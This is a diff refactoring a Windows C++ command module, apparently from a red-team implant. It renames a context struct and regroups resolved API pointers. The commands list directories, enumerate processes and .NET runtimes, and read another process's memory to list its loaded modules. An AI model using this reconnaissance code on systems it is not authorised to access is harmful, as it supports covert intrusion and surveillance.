@@ -33,7 +33,7 @@ namespace Commands {
         const auto path_buffer    = (char*) Malloc(MAX_PATH);
 
         if (dir_string[0] == PERIOD) {
-            if (!(size = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
+            if (!(size = ctx->ioapi.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
                 // LOG ERROR
                 goto defer;
             }
@@ -49,10 +49,10 @@ namespace Commands {
             MemCopy(path_buffer, dir_string, MAX_PATH);
         }
 
-        if ((handle = Ctx->win32.FindFirstFileA(path_buffer, &head))) {
+        if ((handle = ctx->win32.FindFirstFileA(path_buffer, &head))) {
             do {
-                if (!Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
-                    !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
+                if (!ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
+                    !ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
                     // LOG ERROR
                     goto defer;
                 }
@@ -76,7 +76,7 @@ namespace Commands {
                 PackUint32(out, sys_time.wSecond);
                 PackString(out, head.cFileName);
             }
-            while (Ctx->win32.FindNextFileA(handle, &head) != 0);
+            while (ctx->win32.FindNextFileA(handle, &head) != 0);
         }
         else {
             // LOG ERROR
@@ -87,7 +87,7 @@ namespace Commands {
 
     defer:
         if (handle) {
-            Ctx->win32.FindClose(handle);
+            ctx->win32.FindClose(handle);
         }
         if (path_buffer) {
             Free(path_buffer);
@@ -117,13 +117,13 @@ namespace Commands {
         x_assert(pid = Process::GetProcessIdByName(UnpackString(parser, nullptr)));
         x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
-        x_ntassert(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
-        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
-        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
+        x_ntassert(ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
+        x_ntassert(ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
+        x_ntassert(ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
 
         for (head = &loads->InMemoryOrderModuleList; entry != head; entry = module.InMemoryOrderLinks.Flink) {
-            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
-            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
+            x_ntassert(ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
+            x_ntassert(ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
             x_assert(size == module.FullDllName.Length);
 
             if (module.FullDllName.Length > 0) {
@@ -162,8 +162,8 @@ namespace Commands {
         size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
 
-        x_assert(snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
-        x_assert(Ctx->win32.Process32First(snapshot, &entries));
+        x_assert(snapshot = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+        x_assert(ctx->enumapi.Process32First(snapshot, &entries));
 
         do {
             CLIENT_ID cid       = { };
@@ -176,8 +176,8 @@ namespace Commands {
             OBJECT_ATTRIBUTES attr = { };
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
 
-            x_ntassert(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
-            x_ntassert(Ctx->nt.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
+            x_ntassert(ctx->procapi.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
+            x_ntassert(ctx->enumapi.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
             x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));
 
             while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
@@ -200,7 +200,7 @@ namespace Commands {
             }
 
             if (process) {
-                Ctx->nt.NtClose(process);
+                ctx->utilapi.NtClose(process);
             }
             if (meta) {
                 meta->lpVtbl->Release(meta);
@@ -212,13 +212,13 @@ namespace Commands {
                 enums->Release();
             }
         }
-        while (Ctx->win32.Process32Next(snapshot, &entries));
+        while (ctx->enumapi.Process32Next(snapshot, &entries));
 
         MessageQueue(out);
 
         defer:
         if (snapshot) {
-            Ctx->nt.NtClose(snapshot);
+            ctx->utilapi.NtClose(snapshot);
         }
     }
 
